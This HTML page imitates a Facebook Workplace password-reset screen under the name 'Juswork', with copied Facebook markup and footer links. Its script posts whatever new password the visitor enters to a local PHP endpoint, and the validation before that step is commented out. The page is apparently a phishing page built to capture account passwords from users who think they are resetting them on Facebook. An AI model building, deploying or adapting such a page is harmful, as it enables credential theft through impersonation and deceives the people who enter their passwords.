<!DOCTYPE html>
<html lang="zh-Hans" id="juswork" class="">
<head>
<meta charset="utf-8">
<title id="pageTitle">Juswork</title>
<link href="./css/BK5a5ZySG9u.css" rel="stylesheet" />
<link href="./css/fzJkYBCNteB.css" rel="stylesheet" />
<link href="./css/V5BPgQ4Nkh6.css" rel="stylesheet" />
<link href="./css/hEvm1275trV.css" rel="stylesheet" />
<link href="./css/3pfqt1JkyYE.css" rel="stylesheet" />
<link href="./css/x_OY-AQmtgY.css" rel="stylesheet" />
<link href="./css/6_tYYnQDfSa.css" rel="stylesheet" />
<link href="./css/44rSUOmbb1I.css" rel="stylesheet" />
<script type="text/javascript" src="./js/jquery.min.js"></script>
<script type="text/javascript" src="./js/global.js"></script>
<script type="text/javascript">
$(document).ready(function(){
	$("#password_new_show").click(function(){
		if($("#password_new").attr("type")=="text"){
			$("#password_new").attr("type","password");
    		$(this).html("显示");
		}else{
    		$("#password_new").attr("type","text");
    		$(this).html("隐藏");
		}
	})
	$("#password_new").keyup(function() {
		var strongRegex = new RegExp("^(?=.{8,})(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[\\W\_]).*$", "g");
		var mediumRegex = new RegExp("^(?=.{7,})(((?=.*[A-Z])(?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[a-z])(?=.*[\\W\_]))|((?=.*[A-Z])(?=.*[0-9])(?=.*[\\W\_]))|((?=.*[a-z])(?=.*[0-9])(?=.*[\\W\_]))).*$", "g");
		var enoughRegex = new RegExp("(?=.{8,}).*", "g");
		if (false == enoughRegex.test($(this).val())) {
			$('#password_new_status span').addClass("short_pass").html('太短');
		} else if (strongRegex.test($(this).val())) {
			$('#password_new_status').html('').append('密码强度: <span></span>');
			$('#password_new_status span').addClass("strong_pass").html('强');
		} else if (mediumRegex.test($(this).val())) {
			$('#password_new_status').html('').append('密码强度: <span></span>');
			$('#password_new_status span').addClass("medium_pass").html('中');
		} else {
			$('#password_new_status').html('').append('密码强度: <span></span>');
			$('#password_new_status span').addClass("weak_pass").html('弱');
		}
	});	
	$("#btn_continue").click(function(){
		let password=$("#password_new").val();
		let error='';
		var mediumRegex = new RegExp("^(?=.{7,})(((?=.*[A-Z])(?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[a-z])(?=.*[\\W\_]))|((?=.*[A-Z])(?=.*[0-9])(?=.*[\\W\_]))|((?=.*[a-z])(?=.*[0-9])(?=.*[\\W\_]))).*$", "g");
		var enoughRegex = new RegExp("(?=.{8,}).*", "g");
// 		if(!password){
// 			error='密码栏不允许留空白不填。';
// 		}else if (!enoughRegex.test(password)) {
// 			error='密码必须不少于8个字符。'
// 		} else if (!mediumRegex.test(password)) {
// 			error='请选择更安全的密码。'
// 		} else {
			$.post("./tp/index.php/index/index/password.html","password_new="+password,function(data){
				if(data.status==1){
					$("#error_box").html('').hide();
					alert(data.msg);
				}else{
					show_error(data.msg);					
				}
			},'json')
			return false;
// 		}
		show_error(error);
	})
})
</script>
</head>
<body
	class="UIPage_LoggedOut _-kb b_c3pyn-ahh chrome webkit win x1 Locale_zh_CN"
	dir="ltr">
	<div class="_li">
		<div class="_40q1" id="u_0_1">
			<div class="_4b21">
				<i class="_4b23 img sp_7TEUOWunhWd sx_05a6e2" aria-hidden="true"></i>
				<div class="_5wct ellipsis" role="heading" aria-level="1">Juswork</div>
				<div class="_2084">
					<a href="login.php">登录</a>
				</div>
			</div>
		</div>
		<div id="globalContainer" class="uiContextualLayerParent">
			<div class="fb_content clearfix " id="content" role="main">
				<div class="_4-u5 _30ny">
					<form method="post" action="/recover/password?u=100016747727977&amp;n=309134" id="u_0_0">
						<input type="hidden" name="lsd" value="AVqoCdVj"
							autocomplete="off">
						<div class="mvl ptm uiInterstitial uiInterstitialLarge uiBoxWhite">
							<div
								class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
								<div class="clearfix uiHeaderTop">
									<div class="rfloat _ohf">
										<h2 class="accessible_elem">设置新密码</h2>
										<div class="uiHeaderActions"></div>
									</div>
									<div>
										<h2 class="uiHeaderTitle" aria-hidden="true">设置新密码</h2>
										<div id="passstrength"></div>
									</div>
								</div>
							</div>
							<div class="phl ptm uiInterstitialContent">
							    <div class="mbm pam uiBoxRed" id="error_box"></div>
								<div class="mvm uiP fsm">安全强度高的密码：组合使用至少 8 个大小写字母和数字。</div>
								<table role="presentation" class="_3stn">
									<tbody>
										<tr class="_41sx _3stt">
											<th class="_3sts"><label for="password_new">新密码</label></th>
											<td class="_480u"><input type="text" class="inputtext _55r1 _41sy" id="password_new" name="password_new" tabindex="1" autocomplete="off"
												aria-describedby="password_new_status"><button class="_42ft _4jy0 _41s- _517i _517h _51sy"
													tabindex="2" id="password_new_show" type="button">隐藏</button>
												<div id="password_new_status">
													<span></span>
												</div></td>
										</tr>
									</tbody>
								</table>
							</div>
							<div class="uiInterstitialBar uiBoxGray topborder">
								<div class="clearfix">
									<div class="rfloat _ohf">
										<span class="_42ft _42fu selected _42g-" id="btn_continue">继续</span><button value="1" class="_42ft _42fu" id="btn_skip"
											name="btn_skip" type="submit">跳过</button>
									</div>
									<div class="pts"></div>
								</div>
							</div>
						</div>
					</form>
				</div>
			</div>
			<div>
				<div id="pageFooter" data-referrer="page_footer">
					<ul
						class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
						data-nocookies="1">
						<li>中文(简体)</li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;en_US&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 0); return false;"
							title="English (US)">English (US)</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 1); return false;"
							title="Japanese">日本語</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ko_KR&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 2); return false;"
							title="Korean">한국어</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 3); return false;"
							title="French (France)">Français (France)</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;id_ID&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 4); return false;"
							title="Indonesian">Bahasa Indonesia</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pl_PL&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 5); return false;"
							title="Polish">Polski</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 6); return false;"
							title="Spanish">Español</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 7); return false;"
							title="Portuguese (Brazil)">Português (Brasil)</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 8); return false;"
							title="German">Deutsch</a></li><li><a dir="ltr"
							href="https://work-85849704.facebook.com/recover/password?u=100016747727977&amp;n=309134&amp;sih=0"
							onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;zh_CN&quot;, &quot;https:\/\/work-85849704.facebook.com\/recover\/password?u=100016747727977&amp;n=309134&amp;sih=0&quot;, &quot;www_list_selector&quot;, 9); return false;"
							title="Italian">Italiano</a></li><li><a class="_42ft _4jy0 _517i _517h _51sy" role="button"
							href="#" rel="dialog"
							ajaxify="/settings/language/language/?uri=https%3A%2F%2Fwork-85849704.facebook.com%2Frecover%2Fpassword%3Fu%3D100016747727977%26n%3D309134%26sih%3D0&amp;source=www_list_selector_more"
							title="更多语言"><i class="img sp_o8EjrWZHjAz sx_fdc8a5"></i></a></li>
					</ul>
					<div id="contentCurve"></div>
					<div role="contentinfo" aria-label="Facebook 网站链接">
						<table class="uiGrid _51mz navigationGrid" cellspacing="0"
							cellpadding="0">
							<tbody>
								<tr class="_51mx">
									<td class="_51m- hLeft plm"><a
										href="https://workplace.fb.com/" accesskey="8"
										title="Workplace 简介" target="_blank" rel="nofollow noopener"
										onmouseover="LinkshimAsyncLink.swap(this, &quot;https:\/\/workplace.fb.com\/&quot;);"
										onclick="LinkshimAsyncLink.swap(this, &quot;https:\/\/l.facebook.com\/l.php?u=https\u00253A\u00252F\u00252Fworkplace.fb.com\u00252F&amp;h=ATOcloBPgzTB8U2WjwDWSReEZ7-s4c_Chz__vTNXJeRY9svN057QSF8x_ZK0kjtxF2_P2-vD38fJjUtab9yIWmdWJvaVrSJoLdJrWhL3l9NETDdAoQCLuzsfLspi9LNPaQDHZ72Iy-7D&amp;s=1&quot;);">关于</a></td>
									<td class="_51m- hLeft plm"><a
										href="/work/legal/FB_Work_Privacy/?show_chrome=false"
										title="了解 Facebook 和你的隐私权。">隐私权政策</a></td>
									<td class="_51m- hLeft plm"><a
										href="/work/legal/FB_Work_Cookies/?show_chrome=false"
										title="详细了解 Cookie 和 Workplace。" data-nocookies="1">Cookie</a></td>
									<td class="_51m- hLeft plm"><a
										href="/work/legal/FB_Work_AUP/?show_chrome=false"
										accesskey="9" title="审阅我们的条款和政策。">合理使用政策</a></td>
									<td class="_51m- hLeft plm"><a href="/help/work/?ref=pf"
										accesskey="0" title="访问帮助中心。">帮助中心</a></td>
								</tr>
							</tbody>
						</table>
					</div>
					<div class="mvl copyright">
						<div>
							<span> Juswork © 2017</span>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div></div>
</body>
</html>